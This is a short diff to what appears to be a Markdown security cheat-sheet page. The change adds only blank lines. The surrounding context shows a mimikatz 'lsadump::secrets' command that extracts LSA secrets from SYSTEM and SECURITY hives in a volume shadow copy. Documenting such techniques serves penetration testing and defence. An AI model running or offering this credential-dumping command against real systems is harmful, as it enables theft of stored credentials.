@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:52.895105+00:00'
 ```bash
 mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
 ```
+
+
